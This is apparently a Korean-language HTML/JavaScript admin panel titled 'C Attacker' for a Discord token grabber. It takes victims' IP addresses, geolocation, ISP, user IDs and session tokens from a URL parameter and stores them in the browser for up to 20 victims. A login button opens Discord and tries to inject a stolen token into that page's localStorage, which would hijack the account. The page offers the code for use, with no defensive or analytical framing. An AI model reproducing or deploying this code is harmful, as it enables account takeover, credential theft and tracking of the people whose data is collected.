<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>Dashboard</title>
  <style>
    body { background: #0b0b12; color: #eee; font-family: sans-serif; padding: 20px; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { border: 1px solid #333; padding: 8px; text-align: left; word-break: break-all; }
    th { background: #1a1a2e; }
    .btn { padding: 4px 10px; border: none; border-radius: 4px; cursor: pointer; }
    .btn-login { background: #5865F2; color: #fff; }
    .btn-del { background: #e74c3c; color: #fff; }
    .empty { text-align: center; padding: 40px 0; color: #555; }
    .footer { margin-top: 20px; color: #444; font-size: 12px; text-align: right; }
  </style>
</head>
<body>
  <h1>📊 C Attacker</h1>
  <div id="status">📡 수집된 로그: <span id="count">0</span> / 20</div>
  <button onclick="clearAll()">🗑 전체 삭제</button>
  <table>
    <thead>
      <tr>
        <th>#</th>
        <th>IP</th>
        <th>위치</th>
        <th>통신사</th>
        <th>유저 ID</th>
        <th>토큰</th>
        <th>액션</th>
      </tr>
    </thead>
    <tbody id="logBody">
      <tr><td colspan="7" class="empty">아직 수집된 로그가 없습니다.</td></tr>
    </tbody>
  </table>
  <div class="footer">C Attacker v1.0 · 최대 20명</div>

  <script>
    // 데이터 저장소
    let logs = JSON.parse(localStorage.getItem('attacker_logs')) || [];
    const MAX = 20;

    // 테이블 렌더링
    function render() {
      const tbody = document.getElementById('logBody');
      document.getElementById('count').textContent = logs.length;

      if (logs.length === 0) {
        tbody.innerHTML = `<tr><td colspan="7" class="empty">아직 수집된 로그가 없습니다.</td></tr>`;
        return;
      }

      let html = '';
      logs.forEach((log, i) => {
        html += `
          <tr>
            <td>${i+1}</td>
            <td>${log.ip || 'IP 없음'}</td>
            <td>${log.city || ''} ${log.region || ''} ${log.country || ''}</td>
            <td>${log.isp || '알 수 없음'}</td>
            <td>${log.userId || '알 수 없음'}</td>
            <td style="font-size:12px;max-width:200px;overflow:hidden;text-overflow:ellipsis;">${log.token || '토큰 없음'}</td>
            <td>
              <button class="btn btn-login" onclick="login('${log.token}')">🔓 로그인</button>
              <button class="btn btn-del" onclick="del(${i})">✕</button>
            </td>
          </tr>
        `;
      });
      tbody.innerHTML = html;
    }

    // 로그 추가 (무조건 저장)
    function addLog(data) {
      if (!data || (!data.ip && !data.token)) return false;
      if (logs.length >= MAX) {
        alert('최대 20명까지 저장 가능합니다.');
        return false;
      }
      // 중복 체크
      if (logs.some(l => l.ip === data.ip && l.token === data.token)) {
        console.log('중복 로그 무시');
        return false;
      }
      logs.push({
        ip: data.ip || 'IP 없음',
        city: data.city || '알 수 없음',
        region: data.region || '알 수 없음',
        country: data.country || '알 수 없음',
        isp: data.isp || '알 수 없음',
        lat: data.lat || '없음',
        lon: data.lon || '없음',
        token: data.token || '토큰 없음',
        userId: data.userId || '알 수 없음'
      });
      localStorage.setItem('attacker_logs', JSON.stringify(logs));
      render();
      alert('✅ 로그가 저장되었습니다!');
      return true;
    }

    // 삭제
    function del(index) {
      if (!confirm('삭제하시겠습니까?')) return;
      logs.splice(index, 1);
      localStorage.setItem('attacker_logs', JSON.stringify(logs));
      render();
    }

    function clearAll() {
      if (!confirm('모든 로그를 삭제하시겠습니까?')) return;
      logs = [];
      localStorage.setItem('attacker_logs', JSON.stringify(logs));
      render();
    }

    // 로그인
    function login(token) {
      if (!token || token === '토큰 없음') {
        alert('유효한 토큰이 아닙니다.');
        return;
      }
      const win = window.open('https://discord.com/app', '_blank');
      if (!win) {
        alert('팝업 차단을 해제해주세요.');
        return;
      }
      const script = `
        localStorage.setItem('token', JSON.stringify("${token}"));
        location.reload();
      `;
      setTimeout(() => {
        try { win.eval(script); } catch(e) {}
      }, 1500);
      alert('✅ 로그인 시도 중...');
    }

    // URL 파라미터 처리
    (function init() {
      const params = new URLSearchParams(window.location.search);
      const logParam = params.get('log');
      if (logParam) {
        try {
          const decoded = decodeURIComponent(logParam);
          const data = Object.fromEntries(new URLSearchParams(decoded));
          addLog(data);
        } catch(e) {
          alert('❌ 오류: ' + e.message);
        }
        if (window.history && window.history.replaceState) {
          window.history.replaceState({}, document.title, window.location.pathname);
        }
      }
      render();
    })();
  </script>
</body>
</html>
